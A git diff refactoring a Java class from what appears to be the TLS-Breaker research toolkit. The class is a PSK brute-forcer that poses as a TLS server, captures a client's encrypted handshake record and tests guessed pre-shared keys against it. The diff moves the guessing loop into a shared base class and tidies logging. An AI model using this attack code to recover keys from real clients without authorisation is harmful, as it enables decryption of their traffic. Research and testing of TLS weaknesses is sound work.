@@ -11,12 +11,15 @@ package de.rub.nds.tlsbreaker.clientpskbruteforcer.impl;
 
 import static de.rub.nds.tlsattacker.util.ConsoleLogger.CONSOLE;
 
+import java.io.IOException;
+import java.security.NoSuchAlgorithmException;
+import java.util.Arrays;
+import java.util.List;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
-import de.rub.nds.tlsbreaker.breakercommons.attacker.Attacker;
-import de.rub.nds.tlsbreaker.breakercommons.attacker.VulnerabilityType;
-import de.rub.nds.tlsbreaker.breakercommons.psk.guessprovider.GuessProvider;
-import de.rub.nds.tlsbreaker.breakercommons.psk.guessprovider.GuessProviderFactory;
-import de.rub.nds.tlsbreaker.clientpskbruteforcer.config.PskBruteForcerAttackClientCommandConfig;
 import de.rub.nds.tlsattacker.core.config.Config;
 import de.rub.nds.tlsattacker.core.constants.CipherSuite;
 import de.rub.nds.tlsattacker.core.constants.HandshakeByteLength;
@@ -27,7 +30,10 @@ import de.rub.nds.tlsattacker.core.crypto.PseudoRandomFunction;
 import de.rub.nds.tlsattacker.core.exceptions.CryptoException;
 import de.rub.nds.tlsattacker.core.protocol.ProtocolMessage;
 import de.rub.nds.tlsattacker.core.protocol.handler.ClientKeyExchangeHandler;
-import de.rub.nds.tlsattacker.core.protocol.message.*;
+import de.rub.nds.tlsattacker.core.protocol.message.ChangeCipherSpecMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.ClientKeyExchangeMessage;
+import de.rub.nds.tlsattacker.core.protocol.message.HandshakeMessage;
 import de.rub.nds.tlsattacker.core.record.Record;
 import de.rub.nds.tlsattacker.core.record.cipher.RecordCipher;
 import de.rub.nds.tlsattacker.core.record.cipher.RecordCipherFactory;
@@ -46,16 +52,13 @@ import de.rub.nds.tlsattacker.core.workflow.action.TlsAction;
 import de.rub.nds.tlsattacker.core.workflow.action.executor.WorkflowExecutorType;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
-import java.io.IOException;
-import java.security.NoSuchAlgorithmException;
-import java.util.Arrays;
-import java.util.List;
-import java.util.concurrent.TimeUnit;
+import de.rub.nds.tlsbreaker.breakercommons.attacker.VulnerabilityType;
+import de.rub.nds.tlsbreaker.breakercommons.psk.PskBruteForcerAttackCommon;
+import de.rub.nds.tlsbreaker.breakercommons.psk.guessprovider.GuessProvider;
+import de.rub.nds.tlsbreaker.clientpskbruteforcer.config.PskBruteForcerAttackClientCommandConfig;
 
-import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
-
-public class PskBruteForcerAttackClient extends Attacker<PskBruteForcerAttackClientCommandConfig> {
+public class PskBruteForcerAttackClient
+        extends PskBruteForcerAttackCommon<PskBruteForcerAttackClientCommandConfig, State> {
 
     private static final Logger LOGGER = LogManager.getLogger();
 
@@ -66,49 +69,33 @@ public class PskBruteForcerAttackClient extends Attacker<PskBruteForcerAttackCli
     }
 
     @Override
-    public void executeAttack() {
-        guessProvider = GuessProviderFactory.createGuessProvider(config.getGuessProviderType(),
-                config.getGuessProviderInputStream());
+    protected State prepareAttackState() {
         State state = executeHandshakeWithClient();
-        if (state == null) {
-            // sonarlint says this never happens - from a superficial look this seems to be
-            // correct
-            LOGGER.warn("Did not receive ClientHello - attack stopped");
-            return;
-        }
-        Record encryptedRecord = getEncryptedRecordFormClient(state);
-        if (encryptedRecord == null) {
-            LOGGER.warn("Could not find the EncryptedRecord - attack stopped");
-            CONSOLE.warn("Client does not support PSK");
-            return;
-        }
-        boolean result = false;
-        CONSOLE.info(
-                "Got a client connection - starting to guess the PSK. Depending on the Key this may take some time...");
-        long startTime = System.currentTimeMillis();
-        int counter = 0;
-        while (!result && guessProvider.hasNext()) {
-            byte[] guess = guessProvider.next();
-            counter++;
-            if (LOGGER.isDebugEnabled()) {
-                LOGGER.debug("Testing: {}", ArrayConverter.bytesToHexString(guess));
-            }
-            try {
-                result = tryPsk(guess, encryptedRecord, state);
 
-                if (result) {
-                    long duration = System.currentTimeMillis() - startTime;
-                    long totalSeconds = duration / 1000;
-                    CONSOLE.info("Found the psk in {} min {} sec", totalSeconds / 60, totalSeconds % 60);
-                    CONSOLE.info("Guessed {} times", counter);
-                }
-            } catch (NoSuchAlgorithmException ex) {
-                LOGGER.debug(ex);
-                LOGGER.warn("This Algorithm is not implemented yet!");
-                break;
-            } catch (CryptoException c) {
-                LOGGER.trace("Decryption failed", c);
-            }
+        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, state.getWorkflowTrace())) {
+            // already found PSK
+            CONSOLE.info("Client uses the default PSK: {}",
+                    ArrayConverter.bytesToHexString(state.getConfig().getDefaultPSKKey()));
+            return null;
+        }
+        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE,
+                state.getWorkflowTrace())) {
+            throw new RuntimeException("Could not find encrypted record");
+        }
+
+        return state;
+    }
+
+    @Override
+    protected boolean tryPsk(byte[] guess, State attackState) {
+        Record encryptedRecord = (Record) WorkflowTraceUtil.getLastReceivedRecord(attackState.getWorkflowTrace());
+        try {
+            return tryPsk(guess, encryptedRecord, attackState);
+        } catch (NoSuchAlgorithmException e) {
+            throw new RuntimeException("Algorithm is not suported/known", e);
+        } catch (CryptoException e) {
+            LOGGER.trace("Decryption failed", e);
+            return false;
         }
     }
 
@@ -136,21 +123,6 @@ public class PskBruteForcerAttackClient extends Attacker<PskBruteForcerAttackCli
         return state;
     }
 
-    private Record getEncryptedRecordFormClient(State state) {
-        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, state.getWorkflowTrace())) {
-            if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE,
-                    state.getWorkflowTrace())) {
-                return (Record) WorkflowTraceUtil.getLastReceivedRecord(state.getWorkflowTrace());
-            }
-            LOGGER.debug("Could not find encrypted record");
-            return null;
-        } else {
-            CONSOLE.info("Client uses the default PSK: "
-                    + ArrayConverter.bytesToHexString(state.getConfig().getDefaultPSKKey()));
-            return null;
-        }
-    }
-
     private CipherSuite choosePskCipherSuite(List<CipherSuite> cipherSuiteList) {
         for (CipherSuite suite : cipherSuiteList) {
             if (suite.isPsk()) {
@@ -166,20 +138,19 @@ public class PskBruteForcerAttackClient extends Attacker<PskBruteForcerAttackCli
         CONSOLE.info("Started TLS-Server - waiting for a client to Connect...");
         State state = executeClientHelloWorkflow(tlsConfig);
         TlsContext tlsContext = state.getTlsContext();
-        if (WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_HELLO, state.getWorkflowTrace())) {
-            for (CipherSuite cipherSuite : tlsContext.getClientSupportedCipherSuites()) {
-                if (cipherSuite.isPsk()) {
-                    CONSOLE.info("The Client uses Psk. If it uses a weak key then it is vulnerable.");
-                    return VulnerabilityType.VULNERABILITY_POSSIBLE;
-                }
-            }
-            CONSOLE.info("The Client is not supporting Psk.");
-            return VulnerabilityType.NOT_VULNERABLE;
-
-        } else {
+        if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.CLIENT_HELLO, state.getWorkflowTrace())) {
             CONSOLE.info("Did not receive a ClientHello Message - check the Debug output!");
             return VulnerabilityType.TEST_FAILURE;
         }
+        for (CipherSuite cipherSuite : tlsContext.getClientSupportedCipherSuites()) {
+            if (cipherSuite.isPsk()) {
+                CONSOLE.info("The Client uses Psk. If it uses a weak key then it is vulnerable.");
+                return VulnerabilityType.VULNERABILITY_POSSIBLE;
+            }
+        }
+        CONSOLE.info("The Client is not supporting Psk.");
+        return VulnerabilityType.NOT_VULNERABLE;
+
     }
 
     private void continueProtocolFlowToClient(State state) {
@@ -238,10 +209,10 @@ public class PskBruteForcerAttackClient extends Attacker<PskBruteForcerAttackCli
         try {
             byte[] receivedVrfyData = Arrays.copyOfRange(
                     encryptedRecord.getComputations().getPlainRecordBytes().getValue(), 0, controlValue.length);
-            LOGGER.debug("Received Data " + ArrayConverter.bytesToHexString(receivedVrfyData));
-            LOGGER.debug("Control Data " + ArrayConverter.bytesToHexString(controlValue));
+            LOGGER.debug("Received Data {}", ArrayConverter.bytesToHexString(receivedVrfyData));
+            LOGGER.debug("Control Data {}", ArrayConverter.bytesToHexString(controlValue));
             if (Arrays.equals(receivedVrfyData, controlValue)) {
-                CONSOLE.info("Found PSK: " + ArrayConverter.bytesToHexString(guessedPsk));
+                CONSOLE.info("Found PSK: {}", ArrayConverter.bytesToHexString(guessedPsk));
                 return true;
             } else {
                 return false;
